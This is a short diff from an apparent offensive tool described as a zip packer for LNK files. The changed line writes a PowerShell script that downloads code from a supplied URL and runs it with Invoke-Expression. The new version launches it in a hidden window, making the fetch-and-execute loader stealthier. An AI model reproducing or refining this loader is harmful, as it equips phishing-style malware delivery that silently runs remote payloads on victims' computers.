@@ -59,7 +59,7 @@ A simple .zip packer for LNK files - calfcrusher@inventati.org
 
         Console.ResetColor();
         Console.WriteLine();
-        string psContent = $"Invoke-Expression -Command ([Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri '{url}' -UseBasicParsing).Content))";
+        string psContent = $"Start-Process powershell -WindowStyle Hidden -ArgumentList \"-NoProfile -Command `\"Invoke-Expression (iwr -uri '{url}' -UseBasicParsing)`\"\"";  
 
         File.WriteAllText(ps1FilePath, psContent);
 
